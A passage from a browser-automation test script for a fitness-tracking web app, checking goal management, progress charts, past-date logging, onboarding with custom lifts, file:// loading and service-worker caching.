    await gsheet.getByLabel('Where you are today').fill('5');
    await gsheet.getByLabel('Target', { exact: true }).fill('12');
    await gsheet.getByRole('button', { name: '6 months', exact: true }).click();
    await gsheet.getByLabel('Note (optional)').fill('SECRET-GOAL-NOTE');
    await gsheet.getByRole('button', { name: 'Set goal' }).click();
    await gpage.waitForFunction(() => Store.getState().goalOrder.length === 2);
    await gpage.getByRole('button', { name: 'Log a reading' }).click();
    await gsheet.getByRole('spinbutton', { name: 'Reading' }).fill('7');
    await gsheet.getByRole('button', { name: 'Save', exact: true }).click();
    await gpage.waitForFunction(() => Store.getState().goalEntries.length === 1);
    const opts = await gpage.getByLabel('Goal', { exact: true }).locator('option').allTextContents();
    eq(opts.length, 4, 'All goals, Strength, and two goals: ' + opts);
    ok(opts.includes('Pull-ups'), 'the new goal is in the switcher');
    await gpage.getByLabel('Goal', { exact: true }).selectOption('');
    await gpage.waitForTimeout(200);
    const txt = await gpage.locator('#screen').innerText();
    ok(/Pull-ups/.test(txt) && /Half marathon/.test(txt) && /Strength and muscle/.test(txt), 'the overview shows every goal: ' + txt.slice(0, 300));
  });

  await step('goals change: edit the length and target, and the same goal is updated, not duplicated', async () => {
    const [runId] = await goalIds();
    await route(gpage, '#/goals/' + runId);
    await gpage.getByRole('button', { name: 'Edit goal' }).click();
    await gsheet.getByRole('button', { name: '6 months', exact: true }).click();
    await gsheet.getByRole('button', { name: 'Save', exact: true }).click();
    await gpage.waitForFunction((id) => Store.getState().goals[id].weeks === 26, runId);
    eq((await goalIds()).length, 2, 'still two goals');
    const g = await gpage.evaluate((id) => Store.getState().goals[id], runId);
    ok(Math.abs(g.target - 21.098) < 0.01 && g.start, 'target and start kept');
  });

  await step('the plan length can be changed, and the whole app follows', async () => {
    await route(gpage, '#/settings/plan');
    await gpage.getByRole('button', { name: 'Change length' }).click();
    await gsheet.getByRole('button', { name: '3 months', exact: true }).click();
    await gsheet.getByRole('button', { name: 'Save', exact: true }).click();
    await gpage.waitForFunction(() => Store.getState().plan.weeks === 13);
    await route(gpage, '#/today');
    await gpage.waitForSelector('text=Week 1 of 13');
    await route(gpage, '#/goals/plan');
    ok(/13/.test(await gpage.locator('#screen').innerText()), 'Goals shows 13 weeks');
    await gpage.locator('.liftcard').first().click();
    await gpage.waitForSelector('text=All 13 weeks');
    eq(await gpage.locator('.kv', { hasText: /^Wk \d+/ }).count(), 13);
  });

  await step('closing a goal keeps it in Past goals, and it can be reopened or deleted (workouts stay)', async () => {
    const [runId, custId] = await goalIds();
    await route(gpage, '#/goals/' + custId);
    await gpage.getByRole('button', { name: 'Close goal' }).click();
    await gpage.waitForFunction((id) => Store.getState().goals[id].status === 'closed', custId);
    await route(gpage, '#/goals');
    ok(/Past goals/.test(await gpage.locator('#screen').innerText()), 'past goals section');
    await route(gpage, '#/goals/' + custId);
    await gpage.getByRole('button', { name: 'Reopen' }).click();
    await gpage.waitForFunction((id) => Store.getState().goals[id].status === 'active', custId);
    await gpage.getByRole('button', { name: 'Edit goal' }).click();
    await gsheet.getByRole('button', { name: 'Delete' }).click();
    await gpage.locator('#sheets').getByRole('button', { name: 'Delete' }).last().click();
    await gpage.waitForFunction(() => Store.getState().goalOrder.length === 1);
    eq(await gpage.evaluate(() => Store.getState().goalEntries.length), 0, 'its readings went with it');
    eq(await gpage.evaluate(() => Store.getState().workouts.length), 1, 'the run is still logged');
    eq(await goalIds(), [runId]);
  });

  await step('a finished cycle is reviewed and the next one starts from it', async () => {
    const [runId] = await goalIds();
    // move the goal into the past by editing its start, then open it
    await gpage.evaluate(async (id) => { const s = Store.getState(), g = Object.assign({}, s.goals[id], { start: '2020-01-06', weeks: 4 }); const c = Engine.cleanGoal(g); if (!c.ok) throw new Error(c.errors[0]); await Store.append('goal_set', { goal: c.value }, 'user'); }, runId);
    await route(gpage, '#/goals/' + runId);
    await gpage.waitForSelector('text=Start the next cycle');
    await gpage.getByRole('button', { name: 'Start the next cycle' }).click();
    ok(/Next cycle/.test(await gsheet.innerText()), 'the next-cycle sheet opens');
    await gsheet.getByRole('button', { name: 'Set goal' }).click();
    await gpage.waitForFunction(() => Store.getState().goalOrder.length === 2);
    const n = await gpage.evaluate((id) => { const s = Store.getState(); const g = s.goals[s.goalOrder.find((x) => x !== id)]; return { prev: g.prev, weeks: g.weeks, start: g.start }; }, runId);
    eq(n.prev, runId, 'the new goal remembers the one it follows');
  });

  await step('the coach sees a short goals summary, never a goal note', async () => {
    const body = await gpage.evaluate(() => JSON.stringify(Coach.buildContext(Store.getState(), Store.getSettings())));
    ok(/"goals"/.test(body), 'goals are in the context');
    ok(/Strength and muscle/.test(body), 'the plan goal is summarised');
    ok(!/SECRET-GOAL-NOTE/.test(body), 'notes stay on the device');
  });

  await step('goal screens show no stray null, undefined or NaN and log nothing to the console', async () => {
    const bad = /\b(null|undefined|NaN)\b/;
    const ids = await goalIds();
    for (const h of ['#/goals', '#/goals/plan'].concat(ids.map((i) => '#/goals/' + i))) {
      await route(gpage, h);
      const t = await gpage.locator('#screen').innerText();
      ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]);
    }
    eq(gproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await gctx.close();

  // ================= progress: measurement and macro charts =================
  console.log('\nProgress graphs');
  const pgctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const pgpage = await pgctx.newPage(); pgpage.setDefaultTimeout(8000);
  const pgproblems = await collect(pgpage);
  await pgpage.goto(base);
  await pgpage.waitForSelector('text=Track the change.');
  await pgpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -20);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString(), blurPhotos: false });
    const waist = [86, 85.4, 84.9], chest = [100, 100.3];
    for (let i = 0; i < waist.length; i++) await Store.append('measurement_logged', { date: Engine.addDays(U.today(), -10 + i * 3), site: 'waist', cm: waist[i] });
    for (let i = 0; i < chest.length; i++) await Store.append('measurement_logged', { date: Engine.addDays(U.today(), -9 + i * 3), site: 'chest', cm: chest[i] });
    const plan = Store.getState().plan;
    for (let i = 3; i >= 1; i--) await Store.append('food_logged', { date: Engine.addDays(U.today(), -i), meal: 'Lunch', name: 'Fixture meal', kcal: plan.kcal - 100, protein: plan.protein - 10, carbs: plan.carbs - 20, fat: plan.fat - 5 });
  });
  await step('Progress: a measurement site with two or more readings gets a chart with a dot per reading and the six-month goal as a dashed line', async () => {
    await route(pgpage, '#/progress');
    const measCard = pgpage.locator('section.card', { hasText: 'Measurements' });
    await measCard.locator('.chart').first().waitFor();
    eq(await measCard.locator('.chart').count(), 2, 'waist (3 readings) and chest (2 readings) each get a chart');
    const labels = await measCard.locator('.chart').evaluateAll((els) => els.map((e) => e.getAttribute('aria-label')));
    ok(labels.includes('Waist over time'), 'waist chart labelled: ' + labels);
    ok(labels.includes('Chest over time'), 'chest chart labelled: ' + labels);
    eq(await measCard.locator('.chart circle').count(), 5, 'three waist dots plus two chest dots');
    eq(await measCard.locator('.chart polyline[stroke-dasharray="5 4"]').count(), 2, 'a dashed goal line per charted site');
  });
  await step('Progress: Food, last 14 days shows protein, carbs and fat charts against target alongside calories', async () => {
    const foodCard = pgpage.locator('section.card', { hasText: 'Food, last 14 days' });
    await foodCard.waitFor();
    const labels = await foodCard.locator('.chart').evaluateAll((els) => els.map((e) => e.getAttribute('aria-label')));
    eq(labels.length, 4, 'calories plus protein, carbs and fat: ' + labels);
    for (const want of ['Calories per day against target', 'Protein per day against target', 'Carbs per day against target', 'Fat per day against target']) ok(labels.includes(want), want + ' chart present: ' + labels);
    eq(await foodCard.locator('.chart circle').count(), 4 * 3, 'three logged days plotted on each of the four charts');
  });
  eq(pgproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  await pgctx.close();

  // ================= Today: viewing and editing a past date =================
  console.log('\nToday: date navigation');
  const tdctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const tdpage = await tdctx.newPage(); tdpage.setDefaultTimeout(8000);
  const tdproblems = await collect(tdpage);
  await tdpage.goto(base);
  await tdpage.waitForSelector('text=Track the change.');
  await tdpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -10);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [0, 1, 2, 3, 4, 5, 6], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString() });
    location.hash = '#/today'; App.render();
  });
  await tdpage.waitForSelector('text=Week ');
  const tdYesterday = await tdpage.evaluate(() => Engine.addDays(U.today(), -1));
  const tdStart = await tdpage.evaluate(() => Store.getState().plan.startDate);
  const tdLongYesterday = await tdpage.evaluate((d) => U.longDate(d), tdYesterday);

  await step('Today: the date in the header is a button that opens a picker with previous/next day navigation', async () => {
    const dateBtn = tdpage.getByRole('button', { name: /Change date/ });
    eq(await dateBtn.count(), 1, 'the header date is a single button');
    await dateBtn.click();
    const sh = tdpage.locator('#sheets');
    await sh.getByText('Jump to a date').waitFor();
    ok(await sh.getByRole('button', { name: /Next day/ }).isDisabled(), 'cannot go past today');
    ok(!(await sh.getByRole('button', { name: /Previous day/ }).isDisabled()), 'can step back: the plan started 10 days ago');
    await sh.getByRole('button', { name: /Previous day/ }).click();
    await tdpage.getByText('Viewing ' + tdLongYesterday).waitFor();
  });

  await step('Today: viewing a past date shows a banner, and a logged set or weigh-in is dated to that day, not today', async () => {
    eq(await tdpage.evaluate(() => location.hash), '#/today', 'still the Today screen, just a different date');
    await tdpage.getByRole('button', { name: 'Back to today' }).waitFor(); // the viewing banner's own action
    await tdpage.getByRole('button', { name: /Add an exercise|Log an exercise anyway/ }).click();
    const sheet = tdpage.locator('#sheets');
    await sheet.locator('select[aria-label="Exercise"]').selectOption({ label: 'Something else: type a name' });
    await sheet.getByLabel('Name').fill('Face pulls');
    await sheet.getByRole('button', { name: 'Next' }).click();
    await sheet.getByText('Log set').waitFor();
    await sheet.getByLabel('Reps', { exact: true }).fill('15');
    await tdpage.getByRole('button', { name: 'Save', exact: true }).click();
    await tdpage.waitForSelector('.setchip.done');
    const lastSet = (await events(tdpage)).filter((e) => e.type === 'set_logged').pop();
    eq(lastSet.data.date, tdYesterday, 'the set is dated to the viewed day');
    await tdpage.getByLabel(/Weigh again|Morning weight|Weight for this date/).fill('81.4');
    await tdpage.getByRole('button', { name: 'Log', exact: true }).click();
    await tdpage.waitForFunction(() => Store.getState().weights.length === 1);
    const w = (await events(tdpage)).filter((e) => e.type === 'weight_logged').pop();
    eq(w.data.date, tdYesterday, 'the weigh-in is dated to the viewed day');
    ok(/Log food always adds to today/.test(await tdpage.locator('#screen').innerText()), 'food logging is called out as always going to the real today');
  });

  await step('Today: a date outside the plan is refused, and "Back to today" returns to the real date', async () => {
    const dateBtn = tdpage.getByRole('button', { name: /Change date/ });
    await dateBtn.click();
    let sh = tdpage.locator('#sheets');
    await sh.getByLabel('Date', { exact: true }).fill(await tdpage.evaluate((d) => Engine.addDays(d, -1), tdStart));
    await sh.getByRole('button', { name: 'Go', exact: true }).click();
    await tdpage.getByText(/Pick a date within your plan/).waitFor();
    eq(await tdpage.evaluate(() => location.hash), '#/today', 'rejected: still viewing the same day');
    await sh.getByRole('button', { name: 'Back to today', exact: true }).click();
    await tdpage.waitForFunction(() => !document.body.innerText.includes('Viewing '));
    const headerTxt = await tdpage.getByRole('button', { name: /Change date/ }).innerText();
    ok(!/viewing/i.test(headerTxt), 'header no longer flags "viewing": ' + headerTxt);
    ok(headerTxt.includes(await tdpage.evaluate(() => U.longDate(U.today()))), 'header shows the real today\'s date again: ' + headerTxt);
  });

  await step('Today: the backup nudge only appears on the real today, not while looking back', async () => {
    // the plan is 10 days old with no backup yet, so the weekly backup nudge is due on the real today
    ok(/Back up your data/.test(await tdpage.locator('#screen').innerText()), 'on the real today, the backup nudge shows up');
    const dateBtn = tdpage.getByRole('button', { name: /Change date/ });
    await dateBtn.click();
    await tdpage.locator('#sheets').getByRole('button', { name: /Previous day/ }).click();
    await tdpage.getByText(/^Viewing /).waitFor();
    ok(!/Back up your data/.test(await tdpage.locator('#screen').innerText()), 'the backup nudge does not follow you into the past');
    await tdpage.getByRole('button', { name: 'Back to today' }).click();
    await tdpage.waitForFunction(() => !document.body.innerText.includes('Viewing '));
  });
  eq(tdproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  await tdctx.close();

  // ================= file:// =================
  console.log('\nOnboarding with more lifts');
  {
    const c2 = await browser.newContext({ viewport: { width: 390, height: 844 } });
    const p2 = await c2.newPage(); p2.setDefaultTimeout(5000);
    const pr2 = await collect(p2);
    await p2.goto(base);
    await step('onboarding: add lifts beyond the first list, from the catalog and your own; all of them are in the plan', async () => {
      await onboard(p2, { onLifts: async (pg) => {
        await pg.getByRole('button', { name: 'Add another lift' }).click();
        await pg.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption('deadlift');
        await pg.locator('#sheets').getByLabel(/Weight you can do/).fill('140');
        await pg.locator('#sheets').getByLabel('Reps', { exact: true }).fill('5');
        await pg.getByRole('button', { name: 'Add', exact: true }).click();
        await pg.getByRole('button', { name: 'Add another lift' }).click();
        await pg.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption('__custom');
        await pg.locator('#sheets').getByLabel('Name', { exact: true }).fill('Sled push');
        await pg.locator('#sheets').getByLabel('Muscle', { exact: true }).selectOption('legs');
        await pg.locator('#sheets').getByLabel('Equipment', { exact: true }).selectOption('machine');
        await pg.locator('#sheets').getByLabel(/Weight you can do/).fill('200');
        await pg.locator('#sheets').getByLabel('Reps', { exact: true }).fill('10');
        await pg.getByRole('button', { name: 'Add', exact: true }).click();
        ok(await pg.getByLabel('Deadlift weight').count() === 1 && await pg.getByLabel('Sled push weight').count() === 1, 'both listed on the lifts step');
      } });
      const st = await p2.evaluate(() => { const p = Store.getState().plan; return { ids: Object.keys(p.lifts), sled: p.lifts.c_sled_push_1 && p.lifts.c_sled_push_1.equip, placed: p.workouts.flatMap((w) => w.ex).filter((e) => e.lift === 'deadlift' || e.lift === 'c_sled_push_1').length }; });
      ok(st.ids.includes('deadlift') && st.ids.includes('c_sled_push_1') && st.ids.length === 5, 'five tracked lifts: ' + st.ids.join(','));
      eq(st.sled, 'machine'); ok(st.placed >= 2, 'both are on a workout day');
      eq(pr2, [], 'console problems');
    });
    await c2.close();
  }

  console.log('\nApp from file://');
  const fctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const fpage = await fctx.newPage();
  fpage.setDefaultTimeout(5000);
  const fproblems = await collect(fpage);
  await fpage.goto('file://' + path.join(ROOT, 'index.html'));
  await step('file:// loads, onboards and keeps data (IndexedDB works on file URLs)', async () => {
    await fpage.waitForSelector('text=Track the change.');
    await onboard(fpage);
    eq(await fpage.evaluate(() => Store.getState().plan.goal), 'recomp');
    eq(fproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems on file://');
  });
  await fctx.close();

  // ================= service worker on localhost =================
  console.log('\nService worker');
  const sctx = await browser.newContext();
  const spage = await sctx.newPage();
  await spage.goto(base);
  await step('service worker registers on localhost and caches the shell', async () => {
    await spage.waitForFunction(() => navigator.serviceWorker && navigator.serviceWorker.controller || navigator.serviceWorker.ready.then(() => true), null, { timeout: 8000 });
    await spage.waitForTimeout(800);
    const keys = await spage.evaluate(async () => { const ks = await caches.keys(); const c = await caches.open(ks[0]); return (await c.keys()).length; });
    ok(keys >= 20, 'cached ' + keys + ' files');
  });
  await sctx.close();

  await browser.close(); srv.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log('\n' + passed + ' passed, ' + failures.length + ' failed');
  if (failures.length) { console.log(failures.map((f) => ' - ' + f).join('\n')); process.exit(1); }
}
main().catch((e) => { console.error(e); process.exit(1); });
